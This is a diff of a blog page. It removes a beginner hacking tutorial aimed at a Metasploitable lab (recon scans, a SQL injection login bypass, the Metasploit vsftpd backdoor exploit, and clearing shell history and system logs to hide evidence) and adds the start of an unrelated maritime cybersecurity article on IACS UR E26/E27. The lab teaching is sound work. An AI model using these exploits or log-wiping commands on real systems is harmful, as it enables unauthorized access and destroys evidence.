@@ -1,107 +1,1711 @@
-<p>Hello! 😃 This guide is designed to help you practice hacking in a structured and easy-to-follow way.</p><p data-end="297" data-start="77">
-Even if you are new to hacking, you can follow this step-by-step guide and complete the exercises successfully. 🚀</p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiAx41my7lP1S0kBmkbCIDjjgFwTkrhwoBrwmdvI66Rqse3hooUPrXKq45TPKcxtUZGhhz7ujPC7KyNP8-RmuH7UZEJax-N3loOkz91p8sM78irUjhjUG46ToJ3tQYhI-QiPfbHxxsEptOptz2R-7CZ1EUMJ9yODazCu_75JLkQhmRc7MimOalXlQNTjpw/s1792/DALL%C2%B7E%202025-03-09%2022.31.11%20-%20A%20visually%20appealing%20infographic%20for%20a%20beginner's%20hacking%20tutorial.%20The%20infographic%20should%20include__1.%20__Title___%20_%F0%9F%9B%A0%EF%B8%8F%20Hacking%20Practice%20Guide_%20A%20Step-.webp" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="1792" data-original-width="1024" height="640" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiAx41my7lP1S0kBmkbCIDjjgFwTkrhwoBrwmdvI66Rqse3hooUPrXKq45TPKcxtUZGhhz7ujPC7KyNP8-RmuH7UZEJax-N3loOkz91p8sM78irUjhjUG46ToJ3tQYhI-QiPfbHxxsEptOptz2R-7CZ1EUMJ9yODazCu_75JLkQhmRc7MimOalXlQNTjpw/w366-h640/DALL%C2%B7E%202025-03-09%2022.31.11%20-%20A%20visually%20appealing%20infographic%20for%20a%20beginner's%20hacking%20tutorial.%20The%20infographic%20should%20include__1.%20__Title___%20_%F0%9F%9B%A0%EF%B8%8F%20Hacking%20Practice%20Guide_%20A%20Step-.webp" width="366" /></a></div><br /><p data-end="297" data-start="77"><br /></p>
-<hr data-end="302" data-start="299" />
-<h2 data-end="356" data-start="304"><strong data-end="354" data-start="307">1️⃣ Setting Up the Practice Environment 🏗️</strong></h2>
-<h3 data-end="401" data-start="358">✅ <strong data-end="399" data-start="364">1. Installing a Virtual Machine</strong></h3>
-<p data-end="565" data-start="402">Hacking practice should be done in a <strong data-end="469" data-start="439">safe, isolated environment</strong>, not on a real system.<br data-end="495" data-start="492" />
-We will use <strong data-end="521" data-start="507">VirtualBox</strong> or <strong data-end="535" data-start="525">VMware</strong> to set up virtual machines.</p>
-<p data-end="604" data-start="567">📌 <strong data-end="602" data-start="570">Required Software Downloads:</strong></p>
-<ul data-end="883" data-start="605">
-<li data-end="667" data-start="605"><strong data-end="622" data-start="607">VirtualBox:</strong> <a data-end="665" data-start="623" href="https://www.virtualbox.org/" rel="noopener" target="_new">🔗 Download</a></li>
-<li data-end="766" data-start="668"><strong data-end="718" data-start="670">Kali Linux (OS with built-in hacking tools):</strong> <a data-end="764" data-start="719" rel="noopener" target="_new">🔗 Download</a></li>
-<li data-end="883" data-start="767"><strong data-end="817" data-start="769">Metasploitable (Vulnerable practice server):</strong> <a data-end="881" data-start="818" rel="noopener" target="_new">🔗 Download</a></li>
-</ul>
-<h3 data-end="914" data-start="885"><strong data-end="912" data-start="889">Installation Steps:</strong></h3>
-<ol data-end="1193" data-start="915">
-<li data-end="943" data-start="915">Install <strong data-end="940" data-start="926">VirtualBox</strong>.</li>
-<li data-end="1020" data-start="944">Add <strong data-end="965" data-start="951">Kali Linux</strong> and <strong data-end="988" data-start="970">Metasploitable</strong> as separate virtual machines.</li>
-<li data-end="1113" data-start="1021">Set Kali Linux as the <strong data-end="1066" data-start="1046">attacker machine</strong> and Metasploitable as the <strong data-end="1110" data-start="1093">target server</strong>.</li>
-<li data-end="1193" data-start="1114">Connect both virtual machines to the <strong data-end="1190" data-start="1154">same network (Host-Only Adapter)</strong>.</li>
-</ol>
-<p data-end="1220" data-start="1195">Now, you're all set! 🎉</p>
-<hr data-end="1225" data-start="1222" />
-<h2 data-end="1285" data-start="1227"><strong data-end="1283" data-start="1230">2️⃣ Information Gathering (Reconnaissance) 🕵️‍♂️</strong></h2>
-<p data-end="1462" data-start="1287">Before attacking a target, we must first <strong data-end="1350" data-start="1328">gather information</strong> about it.<br data-end="1363" data-start="1360" />
-In this stage, we will find the <strong data-end="1459" data-start="1395">target system's IP address, open ports, and running services</strong>.</p>
-<h3 data-end="1509" data-start="1464"><strong data-end="1507" data-start="1468">📌 1. Finding the Target IP Address</strong></h3>
-<p data-end="1578" data-start="1510">Open the terminal in <strong data-end="1545" data-start="1531">Kali Linux</strong> and run the following command:</p>
-<pre class="!overflow-visible" data-end="1605" data-start="1580"><div class="contain-inline-size rounded-md border-[0.5px] border-token-border-medium relative bg-token-sidebar-surface-primary dark:bg-gray-950"><div class="flex items-center text-token-text-secondary px-4 py-2 text-xs font-sans justify-between rounded-t-[5px] h-9 bg-token-sidebar-surface-primary dark:bg-token-main-surface-secondary select-none">bash</div><div class="overflow-y-auto p-4" dir="ltr"><code class="!whitespace-pre language-bash">netdiscover
-</code></div></div></pre>
-<p data-end="1682" data-start="1606">👉 This will reveal the IP address of the Metasploitable (target) machine.</p>
-<hr data-end="1687" data-start="1684" />
-<h3 data-end="1728" data-start="1689"><strong data-end="1726" data-start="1693">📌 2. Scanning for Open Ports</strong></h3>
-<p data-end="1798" data-start="1729">To check which services are running, we use a tool called <strong data-end="1795" data-start="1787">Nmap</strong>.</p>
-<pre class="!overflow-visible" data-end="1837" data-start="1800"><div class="contain-inline-size rounded-md border-[0.5px] border-token-border-medium relative bg-token-sidebar-surface-primary dark:bg-gray-950"><div class="flex items-center text-token-text-secondary px-4 py-2 text-xs font-sans justify-between rounded-t-[5px] h-9 bg-token-sidebar-surface-primary dark:bg-token-main-surface-secondary select-none">bash</div><div class="overflow-y-auto p-4" dir="ltr"><code class="!whitespace-pre language-bash">nmap -sS -A [Target IP]
-</code></div></div></pre>
-<p data-end="1901" data-start="1838">👉 This command will display open ports and running services.</p>
-<p data-end="1938" data-start="1903">💡 <strong data-end="1936" data-start="1906">Example Nmap Scan Results:</strong></p>
-<pre class="!overflow-visible" data-end="2113" data-start="1940"><div class="contain-inline-size rounded-md border-[0.5px] border-token-border-medium relative bg-token-sidebar-surface-primary dark:bg-gray-950"><div class="flex items-center text-token-text-secondary px-4 py-2 text-xs font-sans justify-between rounded-t-[5px] h-9 bg-token-sidebar-surface-primary dark:bg-token-main-surface-secondary select-none">pgsql</div><div class="overflow-y-auto p-4" dir="ltr"><code class="!whitespace-pre">PORT     STATE  SERVICE   <span class="hljs-keyword">VERSION</span>  
-<span class="hljs-number">22</span>/tcp   <span class="hljs-keyword">open</span>   ssh       OpenSSH <span class="hljs-number">4.3</span>  
-<span class="hljs-number">80</span>/tcp   <span class="hljs-keyword">open</span>   http      Apache httpd <span class="hljs-number">2.2</span><span class="hljs-number">.8</span>  
-<span class="hljs-number">3306</span>/tcp <span class="hljs-keyword">open</span>   mysql     MySQL <span class="hljs-number">5.0</span><span class="hljs-number">.51</span>  
-</code></div></div></pre>
-<p data-end="2210" data-start="2115">Now, we know which services (web server, database, etc.) are running on the target system! 👀</p>
-<hr data-end="2215" data-start="2212" />
-<h2 data-end="2280" data-start="2217"><strong data-end="2278" data-start="2220">3️⃣ Vulnerability Scanning (Scanning &amp; Enumeration) 🔎</strong></h2>
-<p data-end="2346" data-start="2282">Now, let's start <strong data-end="2343" data-start="2299">analyzing the system for vulnerabilities</strong>.</p>
-<h3 data-end="2403" data-start="2348"><strong data-end="2401" data-start="2352">📌 1. Checking for Web Server Vulnerabilities</strong></h3>
-<p data-end="2531" data-start="2404">Metasploitable contains intentionally vulnerable web applications.<br data-end="2473" data-start="2470" />
-Open a <strong data-end="2495" data-start="2480">web browser</strong> and visit <strong data-end="2528" data-start="2506">http://[Target IP]</strong>.</p>
-<p data-end="2639" data-start="2533">✅ You will see several vulnerable web applications.<br data-end="2587" data-start="2584" />
-✅ The target we will focus on is <strong data-end="2636" data-start="2620">"Mutillidae"</strong>.</p>
-<p data-end="2691" data-start="2641">Now, let's scan the website for security issues!</p>
-<pre class="!overflow-visible" data-end="2727" data-start="2693"><div class="contain-inline-size rounded-md border-[0.5px] border-token-border-medium relative bg-token-sidebar-surface-primary dark:bg-gray-950"><div class="flex items-center text-token-text-secondary px-4 py-2 text-xs font-sans justify-between rounded-t-[5px] h-9 bg-token-sidebar-surface-primary dark:bg-token-main-surface-secondary select-none">bash</div><div class="overflow-y-auto p-4" dir="ltr"><code class="!whitespace-pre language-bash">nikto -h [Target IP]
-</code></div></div></pre>
-<p data-end="2802" data-start="2728">👉 <strong data-end="2740" data-start="2731">Nikto</strong> will automatically detect security flaws in the web server.</p>
-<hr data-end="2807" data-start="2804" />
-<h2 data-end="2866" data-start="2809"><strong data-end="2864" data-start="2812">4️⃣ Exploiting Vulnerabilities (Exploitation) 💥</strong></h2>
-<p data-end="2988" data-start="2868">Now, let's perform an actual attack.<br data-end="2907" data-start="2904" />
-We will try <strong data-end="2954" data-start="2919">SQL Injection (database attack)</strong> to bypass login authentication.</p>
-<h3 data-end="3046" data-start="2990"><strong data-end="3044" data-start="2994">📌 1. Bypassing Admin Login with SQL Injection</strong></h3>
-<ol data-end="3222" data-start="3047">
-<li data-end="3084" data-start="3047">Open the <strong data-end="3081" data-start="3059">Mutillidae website</strong>.</li>
-<li data-end="3114" data-start="3085">Find the <strong data-end="3106" data-start="3097">Login</strong> page.</li>
-<li data-end="3222" data-start="3115">Enter the following credentials:
-<ul data-end="3222" data-start="3156">
-<li data-end="3187" data-start="3156"><strong data-end="3171" data-start="3158">Username:</strong> <code data-end="3185" data-start="3172">' OR 1=1 --</code></li>
-<li data-end="3222" data-start="3191"><strong data-end="3206" data-start="3193">Password:</strong> (Leave empty)</li>
-</ul>
-</li>
-</ol>
-<p data-end="3304" data-start="3224">👉 Click "Login," and you will successfully log in as an <strong data-end="3298" data-start="3281">administrator</strong>! 🎯</p>
-<p data-end="3441" data-start="3306">This attack technique is called <strong data-end="3355" data-start="3338">SQL Injection</strong>, where poorly protected web applications allow unauthorized access to the database.</p>
-<hr data-end="3446" data-start="3443" />
-<h2 data-end="3484" data-start="3448"><strong data-end="3482" data-start="3451">5️⃣ Privilege Escalation 🚀</strong></h2>
-<p data-end="3583" data-start="3486">Now, let's go beyond web hacking and gain <strong data-end="3559" data-start="3528">root (administrator) access</strong> to the target system.</p>
-<h3 data-end="3643" data-start="3585"><strong data-end="3641" data-start="3589">📌 1. Exploiting a Vulnerability with Metasploit</strong></h3>
-<p data-end="3707" data-start="3644">Open the <strong data-end="3665" data-start="3653">terminal</strong> in Kali Linux and start <strong data-end="3704" data-start="3690">Metasploit</strong>:</p>
-<pre class="!overflow-visible" data-end="3733" data-start="3709"><div class="contain-inline-size rounded-md border-[0.5px] border-token-border-medium relative bg-token-sidebar-surface-primary dark:bg-gray-950"><div class="flex items-center text-token-text-secondary px-4 py-2 text-xs font-sans justify-between rounded-t-[5px] h-9 bg-token-sidebar-surface-primary dark:bg-token-main-surface-secondary select-none">bash</div><div class="overflow-y-auto p-4" dir="ltr"><code class="!whitespace-pre language-bash">msfconsole
-</code></div></div></pre>
-<p data-end="3798" data-start="3735">Once <strong data-end="3754" data-start="3740">Metasploit</strong> is running, enter the following commands:</p>
-<pre class="!overflow-visible" data-end="3921" data-start="3800"><div class="contain-inline-size rounded-md border-[0.5px] border-token-border-medium relative bg-token-sidebar-surface-primary dark:bg-gray-950"><div class="flex items-center text-token-text-secondary px-4 py-2 text-xs font-sans justify-between rounded-t-[5px] h-9 bg-token-sidebar-surface-primary dark:bg-token-main-surface-secondary select-none">bash</div><div class="sticky top-9 md:top-[5.75rem]"><div class="absolute bottom-0 right-2 flex h-9 items-center"><div class="flex items-center rounded bg-token-sidebar-surface-primary px-2 font-sans text-xs text-token-text-secondary dark:bg-token-main-surface-secondary"><span data-state="closed"><button aria-label="복사" class="flex gap-1 items-center select-none px-4 py-1"><svg class="icon-xs" fill="none" height="24" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path clip-rule="evenodd" d="M7 5C7 3.34315 8.34315 2 10 2H19C20.6569 2 22 3.34315 22 5V14C22 15.6569 20.6569 17 19 17H17V19C17 20.6569 15.6569 22 14 22H5C3.34315 22 2 20.6569 2 19V10C2 8.34315 3.34315 7 5 7H7V5ZM9 7H14C15.6569 7 17 8.34315 17 10V15H19C19.5523 15 20 14.5523 20 14V5C20 4.44772 19.5523 4 19 4H10C9.44772 4 9 4.44772 9 5V7ZM5 9C4.44772 9 4 9.44772 4 10V19C4 19.5523 4.44772 20 5 20H14C14.5523 20 15 19.5523 15 19V10C15 9.44772 14.5523 9 14 9H5Z" fill-rule="evenodd" fill="currentColor"></path></svg>복사</button></span><span data-state="closed"><button class="flex select-none items-center gap-1"><svg class="icon-xs" fill="none" height="24" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M2.5 5.5C4.3 5.2 5.2 4 5.5 2.5C5.8 4 6.7 5.2 8.5 5.5C6.7 5.8 5.8 7 5.5 8.5C5.2 7 4.3 5.8 2.5 5.5Z" fill="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor"></path><path d="M5.66282 16.5231L5.18413 19.3952C5.12203 19.7678 5.09098 19.9541 5.14876 20.0888C5.19933 20.2067 5.29328 20.3007 5.41118 20.3512C5.54589 20.409 5.73218 20.378 6.10476 20.3159L8.97693 19.8372C9.72813 19.712 10.1037 19.6494 10.4542 19.521C10.7652 19.407 11.0608 19.2549 11.3343 19.068C11.6425 18.8575 11.9118 18.5882 12.4503 18.0497L20 10.5C21.3807 9.11929 21.3807 6.88071 20 5.5C18.6193 4.11929 16.3807 4.11929 15 5.5L7.45026 13.0497C6.91175 13.5882 6.6425 13.8575 6.43197 14.1657C6.24513 14.4392 6.09299 14.7348 5.97903 15.0458C5.85062 15.3963 5.78802 15.7719 5.66282 16.5231Z" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" stroke="currentColor"></path><path d="M14.5 7L18.5 11" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" stroke="currentColor"></path></svg>편집</button></span></div></div></div><div class="overflow-y-auto p-4" dir="ltr"><code class="!whitespace-pre language-bash">use exploit/unix/ftp/vsftpd_234_backdoor  
-<span class="hljs-built_in">set</span> RHOSTS [Target IP]  
-<span class="hljs-built_in">set</span> PAYLOAD cmd/unix/interact  
-exploit
-</code></div></div></pre>
-<p data-end="3985" data-start="3923">👉 <strong data-end="3980" data-start="3926">Success! You now have access to the target server!</strong> 🎉</p>
-<p data-end="4044" data-start="3987">Now, you can execute further attacks inside the system.</p>
-<hr data-end="4049" data-start="4046" />
-<h2 data-end="4101" data-start="4051"><strong data-end="4099" data-start="4054">6️⃣ Covering Tracks (Hiding Evidence) 🕶️</strong></h2>
-<p data-end="4244" data-start="4103">Just because you've hacked into a system doesn’t mean your job is done!<br data-end="4177" data-start="4174" />
-To avoid detection, you need to <strong data-end="4241" data-start="4209">erase logs and hide evidence</strong>.</p>
-<h3 data-end="4286" data-start="4246"><strong data-end="4284" data-start="4250">📌 1. Clearing Command History</strong></h3>
-<pre class="!overflow-visible" data-end="4312" data-start="4288"><div class="contain-inline-size rounded-md border-[0.5px] border-token-border-medium relative bg-token-sidebar-surface-primary dark:bg-gray-950"><div class="flex items-center text-token-text-secondary px-4 py-2 text-xs font-sans justify-between rounded-t-[5px] h-9 bg-token-sidebar-surface-primary dark:bg-token-main-surface-secondary select-none">bash</div><div class="overflow-y-auto p-4" dir="ltr"><code class="!whitespace-pre language-bash"><span class="hljs-built_in">history</span> -c
-</code></div></div></pre>
-<h3 data-end="4348" data-start="4314"><strong data-end="4346" data-start="4318">📌 2. Deleting Log Files</strong></h3>
-<pre class="!overflow-visible" data-end="4417" data-start="4350"><div class="contain-inline-size rounded-md border-[0.5px] border-token-border-medium relative bg-token-sidebar-surface-primary dark:bg-gray-950"><div class="flex items-center text-token-text-secondary px-4 py-2 text-xs font-sans justify-between rounded-t-[5px] h-9 bg-token-sidebar-surface-primary dark:bg-token-main-surface-secondary select-none">bash</div><div class="overflow-y-auto p-4" dir="ltr"><code class="!whitespace-pre language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">""</span> &gt; /var/log/auth.log
-<span class="hljs-built_in">echo</span> <span class="hljs-string">""</span> &gt; /var/log/syslog
-</code></div></div></pre>
-<p data-end="4471" data-start="4419">Now, no one will know that you were ever there! 😎</p>
-<hr data-end="4476" data-start="4473" />
-<h2 data-end="4540" data-start="4478"><strong data-end="4538" data-start="4481">7️⃣ Final Steps: What to Do After Hacking Practice 📝</strong></h2>
-<p data-end="4734" data-start="4542">✅ <strong data-end="4603" data-start="4544">Reset your virtual machine after each practice session!</strong><br data-end="4606" data-start="4603" />
-✅ <strong data-end="4664" data-start="4608">Always practice in a legally authorized environment.</strong><br data-end="4667" data-start="4664" />
-✅ <strong data-end="4732" data-start="4669">Use your knowledge to improve security, not to harm others.</strong></p>
-<p data-end="4884" data-start="4736">Now, you’ve learned the <strong data-end="4781" data-start="4760">basics of hacking</strong>! 🎉<br data-end="4788" data-start="4785" />
-If you want to go deeper, explore <strong data-end="4874" data-start="4822">web hacking, system hacking, and network hacking</strong> topics.</p>
-<p data-end="4971" data-is-last-node="" data-is-only-node="" data-start="4886">🔥 <strong data-end="4971" data-is-last-node="" data-start="4889">Want to try more advanced hacking exercises? Stay tuned for the next tutorial!</strong></p>
+<!--════════════════════════════════════════════════════════════
+     Article: Smart Ships, Structural Risk: Why IACS UR E26/E27 Demand a New Operating Model for Shipbuilding
+     Author : Captain Ethan  |  Published: April 2026
+     Source : https://shippauljobs.blogspot.com/
+     Style  : Maritime 4.0 Design System — Blogger-compatible
+════════════════════════════════════════════════════════════-->
+
+<div
+  style="
+    box-sizing: border-box;
+    color: #2c3e50;
+    font-family:
+      &quot;Segoe UI&quot;, &quot;Apple SD Gothic Neo&quot;, Arial, sans-serif;
+    line-height: 1.75;
+    margin: 0px auto;
+    max-width: 780px;
+  "
+>
+  <!--══ HEADER ══-->
+  <div
+    style="
+      background: linear-gradient(
+        135deg,
+        rgb(10, 35, 66) 0%,
+        rgb(21, 79, 122) 55%,
+        rgb(26, 158, 130) 100%
+      );
+      border-radius: 16px;
+      margin-bottom: 36px;
+      padding: 40px 36px 32px;
+    "
+  >
+    <div style="display: flex; flex-wrap: wrap; gap: 7px; margin-bottom: 18px">
+      <span
+        style="
+          background: rgba(255, 193, 7, 0.35);
+          border-radius: 20px;
+          color: #ffe082;
+          font-size: 9px;
+          font-weight: 800;
+          letter-spacing: 1.4px;
+          padding: 3px 11px;
+          text-transform: uppercase;
+        "
+        >🛡️ Cybersecurity</span
+      >
+      <span
+        style="
+          background: rgba(26, 158, 130, 0.35);
+          border-radius: 20px;
+          color: #7effd8;
+          font-size: 9px;
+          font-weight: 800;
+          letter-spacing: 1.4px;
+          padding: 3px 11px;
+          text-transform: uppercase;
+        "
+        >IACS UR E26/E27</span
+      >
+      <span
+        style="
+          background: rgba(255, 255, 255, 0.13);
+          border-radius: 20px;
+          color: #b8d4ea;
+          font-size: 9px;
+          font-weight: 800;
+          letter-spacing: 1.4px;
+          padding: 3px 11px;
+          text-transform: uppercase;
+        "
+        >SCARP</span
+      >
+      <span
+        style="
+          background: rgba(255, 255, 255, 0.13);
+          border-radius: 20px;
+          color: #b8d4ea;
+          font-size: 9px;
+          font-weight: 800;
+          letter-spacing: 1.4px;
+          padding: 3px 11px;
+          text-transform: uppercase;
+        "
+        >Smart Ship</span
+      >
+      <span
+        style="
+          background: rgba(255, 255, 255, 0.13);
+          border-radius: 20px;
+          color: #b8d4ea;
+          font-size: 9px;
+          font-weight: 800;
+          letter-spacing: 1.4px;
+          padding: 3px 11px;
+          text-transform: uppercase;
+        "
+        >Field Insight</span
+      >
+    </div>
+    <h1
+      style="
+        color: white;
+        font-size: 22px;
+        font-weight: 800;
+        letter-spacing: -0.3px;
+        line-height: 1.45;
+        margin: 0px 0px 8px;
+      "
+    >
+      Why IACS UR E26/E27 Demand a New Operating Model for Shipbuilding - Smart
+      Ships, Structural Risk
+    </h1>
+    <p
+      style="
+        color: #b8d4ea;
+        font-size: 13px;
+        font-style: italic;
+        margin: 0px 0px 20px;
+      "
+    >
+      A Decade Inside the Shipyard — What Owner Policy, SCARP, and Industry
+      Standardization Must Mean in Practice
+    </p>
+    <div
+      style="
+        align-items: center;
+        border-top: 1px solid rgba(255, 255, 255, 0.15);
+        display: flex;
+        flex-wrap: wrap;
+        gap: 18px;
+        padding-top: 18px;
+      "
+    >
+      <div style="align-items: center; display: flex; gap: 10px">
+        <img
+          alt="Captain Ethan"
+          src="https://github.com/MaritimeCyber/General/blob/main/Asset/img/member/insung.jpeg?raw=true"
+          style="
+            border-radius: 50%;
+            border: 2px solid rgb(26, 158, 130);
+            flex-shrink: 0;
+            height: 36px;
+            object-fit: cover;
+            width: 36px;
+          "
+        />
+        <div>
+          <div
+            style="
+              color: white;
+              font-size: 13px;
+              font-weight: 700;
+              line-height: 1.3;
+            "
+          >
+            Captain Ethan
+          </div>
+          <div style="color: #9ab5c9; font-size: 10px">
+            Maritime 4.0 · AI, Data &amp; Cyber Security<br />
+            - LinkedIn :
+            <a href="https://www.linkedin.com/in/shipjobs/" style="color: white"
+              >https://www.linkedin.com/in/shipjobs/</a
+            ><br /><br />
+          </div>
+        </div>
+      </div>
+      <div
+        style="
+          align-items: center;
+          color: #9ab5c9;
+          display: flex;
+          font-size: 11px;
+          gap: 5px;
+          margin-left: auto;
+        "
+      >
+        <span><br /></span>
+      </div>
+    </div>
+  </div>
+
+  <!--══ LEAD IMAGE ══-->
+  <div
+    style="
+      border-radius: 12px;
+      border: 1px solid rgb(209, 224, 238);
+      margin-bottom: 32px;
+      overflow: hidden;
+      text-align: center;
+    "
+  >
+    <a
+      href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh5tVd4u3jKruh9JzR3AmG2Db03J9nQCyzlu1MnHjsu9CSVFsDZzE8va3WOZEfTxW6F295J4zdG5IX3tjEZNv7FI_LAgC3gSNseUNfiJo0eUkQ15p1TIFPI60TSBsV3hdjDIsW0jDPq6mOQoD8QXmt2nWYfRxuK7w0tihvJTdUVL8QujUb8Nt23cqWzucM/s1536/ChatGPT%20Image%202025%E1%84%82%E1%85%A7%E1%86%AB%2011%E1%84%8B%E1%85%AF%E1%86%AF%2021%E1%84%8B%E1%85%B5%E1%86%AF%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%2012_39_26.png"
+      rel="noopener"
+      target="_blank"
+    >
+      <img
+        border="0"
+        src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh5tVd4u3jKruh9JzR3AmG2Db03J9nQCyzlu1MnHjsu9CSVFsDZzE8va3WOZEfTxW6F295J4zdG5IX3tjEZNv7FI_LAgC3gSNseUNfiJo0eUkQ15p1TIFPI60TSBsV3hdjDIsW0jDPq6mOQoD8QXmt2nWYfRxuK7w0tihvJTdUVL8QujUb8Nt23cqWzucM/w640-h426/ChatGPT%20Image%202025%E1%84%82%E1%85%A7%E1%86%AB%2011%E1%84%8B%E1%85%AF%E1%86%AF%2021%E1%84%8B%E1%85%B5%E1%86%AF%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%2012_39_26.png"
+        style="display: block; width: 100%"
+      />
+    </a>
+  </div>
+
+  <!--══ LEAD PARAGRAPHS ══-->
+  <p
+    style="
+      background: rgb(240, 247, 255);
+      border-left: 4px solid rgb(26, 158, 130);
+      border-radius: 12px;
+      color: #354a5e;
+      font-size: 15px;
+      line-height: 1.85;
+      margin: 0px 0px 16px;
+      padding: 20px 22px;
+    "
+  >
+    Digitalization, automation, smart ships, and AI-driven operations are
+    advancing at unprecedented speed. The global maritime sector is at a
+    historic turning point — and at the center of this transformation lies one
+    undeniable truth:
+    <strong style="color: #0a2342"
+      >ships are becoming smarter, and simultaneously more vulnerable.</strong
+    >
+  </p>
+  <p
+    style="
+      color: #4a6278;
+      font-size: 14px;
+      line-height: 1.85;
+      margin: 0px 0px 16px;
+    "
+  >
+    IACS UR E26 and UR E27 are no longer "new regulations." They are rapidly
+    becoming the
+    <strong style="color: #0a2342"
+      >operational philosophy and shared language</strong
+    >
+    for every vessel that enters production. Yet even today, few voices clearly
+    explain what these requirements actually mean in the field — what shipyards
+    must do differently, what suppliers are struggling with, and how these gaps
+    affect fleet-wide resilience.
+  </p>
+  <p
+    style="
+      color: #4a6278;
+      font-size: 14px;
+      line-height: 1.85;
+      margin: 0px 0px 32px;
+    "
+  >
+    This lack of clarity is not just a knowledge gap.
+    <strong style="color: #0a2342"
+      >It is becoming a critical risk factor for the entire industry.</strong
+    >
+  </p>
+
+  <!--══ TL;DR ══-->
+  <div
+    style="
+      background: linear-gradient(
+        135deg,
+        rgb(10, 35, 66) 0%,
+        rgb(21, 79, 122) 100%
+      );
+      border-radius: 14px;
+      margin-bottom: 36px;
+      padding: 24px 28px;
+    "
+  >
+    <div
+      style="
+        color: #7effd8;
+        font-size: 10px;
+        font-weight: 800;
+        letter-spacing: 1.8px;
+        margin-bottom: 16px;
+        text-transform: uppercase;
+      "
+    >
+      TL;DR
+    </div>
+    <ol
+      style="
+        display: flex;
+        flex-direction: column;
+        gap: 12px;
+        margin: 0px;
+        padding: 0px 0px 0px 20px;
+      "
+    >
+      <li style="color: #e0eaf5; font-size: 13.5px; line-height: 1.75">
+        The maritime industry's core problem is not technology —
+        <strong style="color: #ffe082">it is structure.</strong> Three
+        structural failures repeat across every project: no Owner Policy,
+        inconsistent E27 documentation, and SCARP misunderstood as a document
+        rather than an operating program.
+      </li>
+      <li style="color: #e0eaf5; font-size: 13.5px; line-height: 1.75">
+        Over a decade inside DSME (now Hanwha Ocean) confirmed that shipbuilding
+        follows two absolute rules:
+        <strong style="color: #ffe082"
+          >schedules are fixed, and Basic Design determines destiny</strong
+        >
+        — the same logic now governs UR E26/E27.
+      </li>
+      <li style="color: #e0eaf5; font-size: 13.5px; line-height: 1.75">
+        Within five years, UR E26/E27 will evolve from compliance rules into the
+        <strong style="color: #7effd8"
+          >actual operating model of the maritime industry.</strong
+        >
+      </li>
+      <li style="color: #e0eaf5; font-size: 13.5px; line-height: 1.75">
+        The industry needs one unified structural model:
+        <strong style="color: #7effd8"
+          >Owner Policy → CRSI → Global Standardization → Long-Term SCARP
+          Framework.</strong
+        >
+      </li>
+      <li style="color: #e0eaf5; font-size: 13.5px; line-height: 1.75">
+        "The structure we use today cannot protect the ships of tomorrow." The
+        transformation cannot wait.
+      </li>
+    </ol>
+  </div>
+
+  <!--══ DIVIDER ══-->
+  <hr
+    style="
+      border-color: currentcolor;
+      border-image: initial;
+      border-style: none;
+      border-top: 2px solid #e2eaf3;
+      border-width: medium;
+      border: none;
+      margin: 0px 0px 36px;
+    "
+  />
+
+  <!--══ SECTION Ⅰ ══-->
+  <div style="margin-bottom: 36px">
+    <div
+      style="align-items: center; display: flex; gap: 10px; margin-bottom: 16px"
+    >
+      <div
+        style="
+          background: linear-gradient(rgb(10, 35, 66), rgb(21, 79, 122));
+          border-radius: 2px;
+          flex-shrink: 0;
+          height: 26px;
+          width: 4px;
+        "
+      ></div>
+      <h2
+        style="
+          color: #0a2342;
+          font-size: 17px;
+          font-weight: 800;
+          letter-spacing: 0.1px;
+          margin: 0px;
+        "
+      >
+        Ⅰ. A Decade Inside the Shipyard — What I Learned
+      </h2>
+    </div>
+    <p
+      style="
+        color: #4a6278;
+        font-size: 14px;
+        line-height: 1.85;
+        margin: 0px 0px 16px;
+      "
+    >
+      During more than ten years at DSME (currently Hanwha Ocean) — working
+      across IT Planning, Production Innovation, Basic Design, and R&amp;D — I
+      learned how ships are truly designed, built, and delivered. Two truths
+      became deeply embedded:
+    </p>
+    <div
+      style="
+        display: grid;
+        gap: 14px;
+        grid-template-columns: 1fr 1fr;
+        margin-bottom: 18px;
+      "
+    >
+      <div
+        style="
+          background: linear-gradient(
+            135deg,
+            rgb(10, 35, 66),
+            rgb(21, 79, 122)
+          );
+          border-radius: 12px;
+          padding: 22px 20px;
+          text-align: center;
+        "
+      >
+        <div style="font-size: 28px; margin-bottom: 8px">⏱️</div>
+        <div
+          style="
+            color: #ffe082;
+            font-size: 14px;
+            font-weight: 800;
+            margin-bottom: 6px;
+          "
+        >
+          Shipbuilding Schedules Are Absolute
+        </div>
+        <div style="color: #c8dff0; font-size: 13px; line-height: 1.65">
+          Delivery dates are not targets — they are structural commitments that
+          cascade through every design and production decision.
+        </div>
+      </div>
+      <div
+        style="
+          background: linear-gradient(
+            135deg,
+            rgb(21, 79, 122),
+            rgb(26, 158, 130)
+          );
+          border-radius: 12px;
+          padding: 22px 20px;
+          text-align: center;
+        "
+      >
+        <div style="font-size: 28px; margin-bottom: 8px">📐</div>
+        <div
+          style="
+            color: #ffe082;
+            font-size: 14px;
+            font-weight: 800;
+            margin-bottom: 6px;
+          "
+        >
+          Basic Design Determines Destiny
+        </div>
+        <div style="color: #c8dff0; font-size: 13px; line-height: 1.65">
+          Specifications set during L0/L1 define the ship for its entire
+          operational life. What is not designed in cannot be retrofitted
+          without cost.
+        </div>
+      </div>
+    </div>
+    <p style="color: #4a6278; font-size: 14px; line-height: 1.85; margin: 0px">
+      These same truths now shape how we must approach UR E26/E27. Cybersecurity
+      follows the same logic:
+      <strong style="color: #0a2342"
+        >schedule, specification, Basic Design.</strong
+      >
+      The terminology sounds complex — the operational reality is
+      straightforward and unmistakable.
+    </p>
+  </div>
+
+  <!--══ DIVIDER ══-->
+  <hr
+    style="
+      border-color: currentcolor;
+      border-image: initial;
+      border-style: none;
+      border-top: 2px solid #e2eaf3;
+      border-width: medium;
+      border: none;
